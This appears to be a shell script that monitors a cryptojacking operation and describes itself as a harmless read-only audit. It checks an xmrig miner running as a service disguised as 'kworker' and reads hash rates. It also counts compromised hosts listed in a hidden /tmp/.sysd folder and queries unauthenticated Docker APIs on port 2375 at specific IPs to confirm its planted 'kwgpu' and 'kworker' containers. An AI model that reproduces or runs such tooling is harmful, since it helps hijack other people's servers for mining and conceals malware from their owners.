#!/bin/sh
# throwaway: broad read-only audit of the whole operation. Changes nothing.
S=/tmp/.sysd
echo "== when"; date -u; echo "== uptime"; uptime
echo "== disk"; df -h / | tail -1; df -i / | tail -1
echo "== failed units"; systemctl --failed --no-legend 2>/dev/null | head -8
echo "== timers"; systemctl list-timers --all --no-legend 2>/dev/null | grep kworker | head -20
echo "== kworker svc"; systemctl is-active kworker 2>/dev/null; systemctl is-enabled kworker 2>/dev/null
echo "== xmrig count"; pgrep -c xmrig 2>/dev/null
echo "== box1 speed"; journalctl -u kworker -n 500 --no-pager 2>/dev/null | grep -o 'speed [^|]*H/s' | tail -2
echo "== nestd svc"; systemctl is-active kworker-nestd 2>/dev/null; curl -s -m 4 http://127.0.0.1:8080/stat 2>/dev/null | head -c 220
echo "== .hunt listing"; ls -la $S/.hunt 2>/dev/null | tail -26
echo "== owned"; grep -c . $S/.hunt/dock.owned 2>/dev/null
echo "== class ledger"; cut -f2 $S/.hunt/dock.cls 2>/dev/null | sort | uniq -c | sort -rn | head -12
echo "== deploy rows"; grep -c gpu_deployed $S/.hunt/dock.cls 2>/dev/null; grep gpu_pullfail $S/.hunt/dock.cls 2>/dev/null | head -4
echo "== filter live in dock.sh"; grep -c dock.dead $S/dock.sh 2>/dev/null; wc -l < $S/.hunt/dock.dead 2>/dev/null
echo "== cls procs"; pgrep -fc dockcls 2>/dev/null
echo "== classifier tail"; tail -5 /tmp/_gf2.out 2>/dev/null
echo "== dock tail"; tail -10 /tmp/_dock.out 2>/dev/null
echo "== mass.found"; wc -l < $S/.hunt/mass.found 2>/dev/null
echo "== nest tail"; tail -6 /tmp/_dn.out 2>/dev/null
echo "== gpu box"; curl -sS -m 6 http://134.209.121.89:2375/containers/kwgpu/json 2>/dev/null | grep -o -e '"Status":"[^"]*"' -e '"ExitCode":[0-9-]*' | head -3
echo "== what our containers look like per owned host"
for ip in $(cut -f1 $S/.hunt/dock.owned 2>/dev/null | sort -u); do
    n=$(curl -sS -m 4 "http://$ip:2375/containers/json?all=1" 2>/dev/null | grep -o -e kwgpu -e kworker | sort -u | tr '\n' ',')
    printf '%s %s\n' "${n:-NONE}" "$ip"
done | sort | uniq -c | sort -rn | head -22
echo "== done"; date -u
